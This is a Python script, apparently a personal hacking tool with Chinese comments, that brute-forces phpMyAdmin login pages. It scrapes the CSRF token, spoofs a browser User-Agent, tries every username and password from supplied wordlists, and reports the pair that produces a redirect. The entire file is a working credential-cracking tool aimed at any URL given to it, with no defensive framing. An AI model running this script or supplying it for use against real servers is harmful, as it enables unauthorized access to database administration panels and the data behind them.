#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 20/6/18 14:53
# @Author  : Chaos
# @File    : crack_phpmyadmin.py

import requests,re,sys
import time
from colorama import Fore



# 获取token
def Get_Token(url):
    req = requests.get(url)
    if req.status_code == 200:
        token = re.search("name=\"token\" value=\"(.*?)\"",req.text).group(1)
        return token
    else:
        print(Fore.RED + "[-]" + Fore.WHITE + " 访问网站失败,响应码为: {0}".format(req.status_code))
        exit(0)

def Crack(url,users,passwords):
    header = {"User-Agent": "Mozilla / 5.0(Windows NT 10.0;WOW64;rv: 52.0) Gecko / 20100101Firefox / 52.0"}
    for user in users:
        for pwd in passwords:
            sess = requests.session()
            req = sess.get(url, headers=header)
            token = re.search("name=\"token\" value=\"(.*?)\"", req.text).group(1)
            data = {
                "pma_username": user,  # 用户
                "pma_password": pwd,  # 密码
                "server": "1",
                "lang": "zh_CN",
                "token": token  # token
            }
            #print(data)
            print(Fore.RED + "[*] " + Fore.WHITE + "正在进行破解：{0}   |   {1}".format(user, pwd))
            r = sess.post(url,data=data,headers=header,allow_redirects=False)
            #print(r.status_code)
            time.sleep(0.3)
            if r.status_code == 302:
                print(Fore.GREEN + "[+] " + "{0} {1}".format(user, pwd))
                exit(0)
    print(Fore.RED + "[-] " + Fore.WHITE + "爆破失败，请换个字典")

if __name__ == "__main__":
    Url = sys.argv[1]
    user = []
    passwords = []
    for username in open(sys.argv[2],"r"):
        user.append(username.strip("\n"))
    for p in open(sys.argv[3], "r"):
        passwords.append(p.strip("\n"))
    print(Fore.GREEN + "[+] 开始暴力破解phpmyadmin" + Fore.WHITE)
    # "http://127.0.0.1/phpmyadmin/"
    Crack(Url+"/",user, passwords)
